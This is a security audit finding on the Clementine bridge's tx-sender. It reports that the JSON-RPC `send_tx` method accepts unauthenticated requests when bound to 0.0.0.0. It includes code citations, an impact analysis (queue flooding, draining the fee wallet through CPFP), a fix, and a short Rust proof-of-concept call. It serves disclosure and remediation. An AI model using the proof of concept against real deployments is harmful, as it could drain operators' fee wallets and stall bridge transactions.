### Title
Unauthenticated JSON-RPC `send_tx` Allows Any Network-Reachable Client to Enqueue Arbitrary Bitcoin Transactions — (`crates/clementine-tx-sender/src/jsonrpc/server.rs`)

### Summary

The tx-sender JSON-RPC server is built with `jsonrpsee::ServerBuilder::default()` — no authentication layer, no token, no mTLS, no IP allowlist. The config explicitly permits binding to `0.0.0.0`. When that binding is used, any network-reachable HTTP client can call `send_tx` and write an arbitrary `raw_tx` row into `tx_sender_try_to_send_txs`, violating the invariant that only the bridge actor process may enqueue transactions for broadcast.

---

### Finding Description

`start_jsonrpc_server` constructs the server with no middleware:

```rust
let server: Server = ServerBuilder::default()
    .max_request_body_size(MAX_JSONRPC_REQUEST_BODY_SIZE)
    .build(bind_addr)
    .await
    ...
``` [1](#0-0) 

The `send_tx` handler immediately deserializes the caller-supplied hex and calls `insert_try_to_send` with no credential check:

```rust
module.register_async_method("send_tx", |params, client, _| async move {
    let req: InsertTryToSendParams = params.one().map_err(jsonrpc_err)?;
    ...
    client.insert_try_to_send(&mut dbtx, req.tx_metadata, &signed_tx, req.fee_paying_type, ...).await
``` [2](#0-1) 

`insert_try_to_send` unconditionally persists the transaction:

```rust
let try_to_send_id = self.db.save_tx(dbtx, tx_metadata, signed_tx, fee_paying_type, txid, rbf_signing_info).await?;
``` [3](#0-2) 

The config validation explicitly allows `0.0.0.0` as a bind address:

```rust
if bind != "127.0.0.1" && bind != "0.0.0.0" {
    return Err(...);
}
``` [4](#0-3) 

This is not a documentation comment — it is the only validation performed. `0.0.0.0` is a first-class supported value, intended for deployments where the bridge actor and tx-sender run on separate hosts.

---

### Impact Explanation

When `TX_SENDER_JSONRPC_BIND=0.0.0.0` is used (explicitly supported):

1. **Authorization invariant broken**: Any HTTP client can enqueue transactions. The invariant that only the bridge actor may call `insert_try_to_send` is entirely unenforced at the code level.
2. **Queue pollution / liveness**: An attacker floods `tx_sender_try_to_send_txs` with garbage rows. The tx-sender loop processes every row on each tick, delaying or starving legitimate bridge transactions (kickoff, payout, challenge, reimbursement).
3. **Fee wallet drain via CPFP**: The attacker specifies `fee_paying_type: CPFP`. The tx-sender creates a fee-paying child transaction spending from its own Bitcoin wallet for each queued row. Even if the parent is invalid and rejected by the mempool, the tx-sender's internal UTXO tracking marks those wallet outputs as in-use, reducing the effective balance available for legitimate fee bumps. Sustained flooding can exhaust the fee wallet, halting all bridge transaction broadcasting.

The specific claim of directly spending bridge-controlled UTXOs or burning collateral is **not achievable** without the bridge's private signing keys — the attacker cannot forge valid Taproot signatures. However, the authorization bypass and fee-wallet exhaustion are real and scoped entirely within the repository code.

---

### Likelihood Explanation

The `0.0.0.0` bind path is explicitly coded, validated, and documented. Any production deployment where the bridge actor and tx-sender are on separate hosts requires it. No exploit primitive beyond a plain HTTP POST is needed.

---

### Recommendation

Add a shared-secret or bearer-token check as a `jsonrpsee` middleware layer before any method dispatch. Alternatively, enforce loopback-only binding in code (remove `0.0.0.0` as a valid option) and require callers to use a Unix socket or SSH tunnel for cross-host access. The fix must be in `start_jsonrpc_server` — network-level controls alone are insufficient because the code itself provides no fallback.

---

### Proof of Concept

```rust
// No credentials needed. Connect to the tx-sender JSON-RPC port and call send_tx.
let client = HttpClientBuilder::default().build("http://<tx-sender-host>:3030").unwrap();
let params = rpc_params![InsertTryToSendParams {
    tx_metadata: None,
    signed_tx_hex: hex::encode(bitcoin::consensus::serialize(&crafted_tx)),
    fee_paying_type: FeePayingType::CPFP,
    rbf_signing_info: None,
    cancel_outpoints: vec![],
    cancel_txids: vec![],
    activate_txids: vec![],
    activate_outpoints: vec![],
}];
let id: u32 = client.request("send_tx", params).await.unwrap();
// Row now exists in tx_sender_try_to_send_txs; tx-sender loop will attempt CPFP broadcast.
```

The existing test `test_jsonrpc_txsender_insert_try_to_send` already demonstrates this path succeeds with zero credentials — it connects over plain HTTP and asserts the row is persisted. [5](#0-4)

### Citations

**File:** crates/clementine-tx-sender/src/jsonrpc/server.rs (L46-50)
```rust
    let server: Server = ServerBuilder::default()
        .max_request_body_size(MAX_JSONRPC_REQUEST_BODY_SIZE)
        .build(bind_addr)
        .await
        .map_err(|e| BridgeError::Eyre(e.into()))?;
```

**File:** crates/clementine-tx-sender/src/jsonrpc/server.rs (L58-79)
```rust
        .register_async_method("send_tx", |params, client, _| async move {
            let req: InsertTryToSendParams = params.one().map_err(jsonrpc_err)?;

            let raw_tx = hex::decode(&req.signed_tx_hex).map_err(jsonrpc_err)?;
            let signed_tx: Transaction = consensus::deserialize(&raw_tx).map_err(jsonrpc_err)?;

            let mut dbtx = client.db.begin_transaction().await.map_err(jsonrpc_err)?;

            let try_to_send_id = client
                .insert_try_to_send(
                    &mut dbtx,
                    req.tx_metadata,
                    &signed_tx,
                    req.fee_paying_type,
                    req.rbf_signing_info,
                    &req.cancel_outpoints,
                    &req.cancel_txids,
                    &req.activate_txids,
                    &req.activate_outpoints,
                )
                .await
                .map_err(jsonrpc_err)?;
```

**File:** crates/clementine-tx-sender/src/jsonrpc/server.rs (L121-195)
```rust
    #[tokio::test]
    async fn test_jsonrpc_txsender_insert_try_to_send() -> Result<(), BridgeError> {
        use std::time::{Duration, Instant};

        use crate::jsonrpc::client::JsonRpcTxSenderClient;
        use crate::task::spawn_txsender_loop_with_free_localhost_jsonrpc_port;
        use bitcoin::absolute;
        use bitcoin::hashes::Hash as _;
        use bitcoin::transaction::Version;
        use bitcoin::{OutPoint, ScriptBuf, Sequence, Transaction, TxIn, TxOut, Txid, Witness};

        let (config, db, rpc) = create_test_environment(true, true).await;
        let rpc = rpc.unwrap();
        let db = db.unwrap();
        rpc.rpc().mine_blocks(1).await.unwrap();

        // Start txsender with JSON-RPC enabled on a free port.
        let tx_sender_cfg = config.clone();
        let (addr, handle) = spawn_txsender_loop_with_free_localhost_jsonrpc_port(tx_sender_cfg);
        let url = format!("http://{addr}");
        let client =
            JsonRpcTxSenderClient::new(&url).map_err(|e| BridgeError::Eyre(eyre::eyre!(e)))?;

        // A minimal syntactically-valid transaction (doesn't need to be mineable for enqueueing).
        let tx = Transaction {
            version: Version::TWO,
            lock_time: absolute::LockTime::ZERO,
            input: vec![TxIn {
                previous_output: OutPoint {
                    txid: Txid::all_zeros(),
                    vout: 0,
                },
                script_sig: ScriptBuf::new(),
                sequence: Sequence::ENABLE_LOCKTIME_NO_RBF,
                witness: Witness::default(),
            }],
            output: vec![TxOut {
                value: bitcoin::Amount::from_sat(0),
                script_pubkey: ScriptBuf::new(),
            }],
        };

        // Wait for server to come up (spawn loop initializes asynchronously).
        let start = Instant::now();
        let try_to_send_id = loop {
            match client
                .insert_try_to_send(None, &tx, FeePayingType::CPFP, None, &[], &[], &[], &[])
                .await
            {
                Ok(id) => break id,
                Err(e) => {
                    if start.elapsed() > Duration::from_secs(10) {
                        return Err(BridgeError::Eyre(eyre::eyre!(
                            "Timed out waiting for txsender JSON-RPC to start: {e:?}"
                        )));
                    }
                    tokio::time::sleep(Duration::from_millis(100)).await;
                }
            }
        };

        // Verify persisted in DB.
        let tx_sender_db = TxSenderDb::from_pool(db.pool().clone());
        let (_meta, stored_tx, fee_paying_type, _seen_at_height, _rbf) = tx_sender_db
            .get_try_to_send_tx(None, try_to_send_id)
            .await?;
        assert_eq!(fee_paying_type, FeePayingType::CPFP);
        assert_eq!(stored_tx.compute_txid(), tx.compute_txid());

        // Stop background loop.
        handle.abort();
        let _ = handle.await;

        Ok(())
    }
```

**File:** crates/clementine-tx-sender/src/client.rs (L91-101)
```rust
        let try_to_send_id = self
            .db
            .save_tx(
                dbtx,
                tx_metadata,
                signed_tx,
                fee_paying_type,
                txid,
                rbf_signing_info,
            )
            .await?;
```

**File:** crates/clementine-tx-sender/src/config.rs (L203-208)
```rust
                if bind != "127.0.0.1" && bind != "0.0.0.0" {
                    return Err(BridgeError::EnvVarMalformed(
                        "TX_SENDER_JSONRPC_BIND",
                        "bind must be either 127.0.0.1 or 0.0.0.0".to_string(),
                    ));
                }
```
